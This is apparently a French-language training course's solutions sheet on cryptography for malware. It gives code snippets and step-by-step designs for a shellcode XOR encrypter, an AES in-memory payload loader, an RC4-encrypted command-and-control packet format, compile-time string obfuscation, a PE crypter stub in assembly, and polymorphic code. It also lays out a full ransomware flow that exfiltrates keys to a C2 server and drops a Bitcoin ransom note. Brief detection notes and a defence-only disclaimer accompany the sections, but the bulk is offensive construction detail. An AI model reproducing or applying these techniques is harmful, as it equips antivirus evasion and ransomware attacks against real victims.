SOLUTIONS - MODULE 28 : CRYPTOGRAPHIE

⚠️ AVERTISSEMENT : Architecture malware conceptuelle. Comprendre pour défendre.

SOLUTION 1 : SHELLCODE XOR ENCRYPTER

Architecture :
1. Lire shellcode binaire (fread)
2. Générer multi-byte key aléatoire (CryptGenRandom ou /dev/urandom)
3. XOR encrypt loop : shellcode[i] ^= key[i % keylen]
4. Output format C array compilable

Stub generator Python :
key = bytes([0xDE, 0xAD, 0xBE, 0xEF])
encrypted = bytes([sc[i] ^ key[i%len(key)] for i in range(len(sc))])
print(f"unsigned char sc[] = {{" + ",".join(f"0x{b:02X}" for b in encrypted) + "};")

Détection : Entropy analysis, XOR loop patterns dans code


SOLUTION 2 : AES-256-CBC PAYLOAD ENCRYPTER

OpenSSL EVP API :
EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);
EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len);
EVP_EncryptFinal_ex(ctx, ciphertext + len, &len);  // PKCS7 padding auto

Windows CryptoAPI alternative :
CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, 0);
CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
CryptEncrypt(hKey, 0, TRUE, 0, data, &len, buflen);

Loader architecture :
1. VirtualAlloc(payload_size, PAGE_READWRITE)
2. Decrypt AES-256-CBC en mémoire
3. VirtualProtect(..., PAGE_EXECUTE_READ)
4. CreateThread ou direct call

Détection : High entropy PE sections, CryptEncrypt/EVP_Encrypt imports


SOLUTION 3 : RC4 STREAM CIPHER C2

Implementation KSA (Key Scheduling) :
for i=0..255: S[i] = i
j = 0
for i=0..255:
    j = (j + S[i] + key[i mod keylen]) mod 256
    swap(S[i], S[j])

PRGA (Pseudo-Random Generation) :
i = j = 0
while generating:
    i = (i + 1) mod 256
    j = (j + S[i]) mod 256
    swap(S[i], S[j])
    output = S[(S[i] + S[j]) mod 256]

C2 packet format :
[magic(4)|len(2)|encrypted_payload|hmac_sha256(32)]

Key exchange : Diffie-Hellman ou RSA-encrypted session key

Détection : RC4 weak keys, patterns dans traffic, HMAC verification


SOLUTION 4 : STRING OBFUSCATION COMPILE-TIME

C++ constexpr approach :
template<size_t N>
constexpr auto xor_string(const char (&str)[N], char key) {
    std::array<char, N> result{};
    for(size_t i=0; i<N-1; i++) result[i] = str[i] ^ key;
    return result;
}


```bash
#define OBFSTR(s) []{ \
```
    constexpr auto enc = xor_string(s, __LINE__ & 0xFF); \
    static char dec[sizeof(s)]; \
    for(size_t i=0; i<sizeof(s)-1; i++) dec[i] = enc[i] ^ (__LINE__ & 0xFF); \
    return dec; \
}()

Usage : CreateProcessA(OBFSTR("cmd.exe"), ...)

Vérification : strings binary.exe | grep -i cmd  // Rien trouvé

Détection : Analyse runtime memory, decryption stubs patterns


SOLUTION 5 : PE CRYPTER (FULL BINARY)

Étapes :
1. Parser PE : IMAGE_DOS_HEADER, IMAGE_NT_HEADERS
2. Identifier sections à chiffrer (.text, .data, .rdata)
3. Sauvegarder OEP (Original Entry Point)
4. Chiffrer sections avec AES-256
5. Créer nouvelle section .decrypt avec stub
6. Modifier Entry Point -> .decrypt stub
7. Stub runtime :
   - Déchiffrer sections en mémoire
   - Fixer relocations si ASLR
   - Jump vers OEP

Stub assembly skeleton :
push ebp
call get_delta     ; Position-independent code
get_delta:
pop ebx
sub ebx, offset get_delta
; ebx = delta offset
lea esi, [ebx + encrypted_data]
mov ecx, data_size
call aes_decrypt_inline
jmp original_entry_point

Détection : New sections (.decrypt, .crypt), modified entry point


SOLUTION 6 : POLYMORPHIC MALWARE

Techniques :
1. Clé XOR aléatoire chaque build : key = rand_bytes(16)
2. Junk instructions insertion :
   - nop, xchg eax,eax
   - push/pop pairs
   - mov reg,reg
3. Instruction reordering (equivalent logic) :
   - mov eax, 5; add eax, 3  ===  mov eax, 8
   - Code permutation préservant sémantique
4. Variable/function name obfuscation
5. Register allocation variation

MSFvenom shikata_ga_nai architecture :
- Polymorphic XOR decoder loop
- Key embedded in code
- FPU GetPC technique
- Self-modifying code

Détection : Behavioral analysis post-decryption, emulation


SOLUTION 7 : RANSOMWARE CRYPTO ARCHITECTURE

Flow complet :
1. Startup :
   - Générer RSA-2048 keypair (victim unique)
   - Exfiltrer private key vers C2 (HTTP POST)
   - Stocker public key localement

2. File encryption :
   for each file:
       - Générer AES-256 key aléatoire
       - Chiffrer fichier AES-256-CTR (rapide)
       - Chiffrer AES key avec RSA public
       - Remplacer fichier : [magic(8)|encrypted_aes_key(256)|iv(16)|encrypted_data]
       - Extension : .locked ou .encrypted

3. Ransom note :
   - Victim ID (hash public key)
   - Bitcoin address
   - Instructions décryptage
   - Deadline avec countdown

4. Decryptor :
   - Input : RSA private key (from C2 after payment)
   - Pour chaque fichier :
     - Extraire encrypted AES key
     - Déchiffrer AES key avec RSA private
     - Déchiffrer fichier data avec AES key
     - Restore original

Détection : File modification patterns, entropy spikes, ransom note IOCs

IMPORTANT : Architecture fournie pour DÉFENSE uniquement (incident response, decryptors)


SOLUTION 8 : PBKDF2 KEY DERIVATION

OpenSSL :
unsigned char salt[16];
RAND_bytes(salt, sizeof(salt));

unsigned char derived_key[32];  // 256-bit
PKCS5_PBKDF2_HMAC(password, strlen(password),
                  salt, sizeof(salt),
                  100000,  // iterations (OWASP recommande 600k+ pour 2023)
                  EVP_sha256(),
                  sizeof(derived_key), derived_key);

Windows CryptoAPI :
BCryptDeriveKeyPBKDF2(hAlg, password, password_len,
                      salt, salt_len,
                      iterations,
                      derived_key, key_len, 0);

Usage malware :
- Payload chiffré avec password-derived key
- Distribuer password séparément (social engineering)
- Éviter stockage clé brute dans binary

Détection : PBKDF2/BCrypt API calls, high CPU usage (iterations)

RÉFÉRENCES :
- OpenSSL EVP documentation
- Veil-Evasion framework (payload encryption)
- Metasploit encoders (shikata_ga_nai)
- Cobalt Strike Artifact Kit
- PE-bear (PE analysis tool)
- CFF Explorer (PE editor)

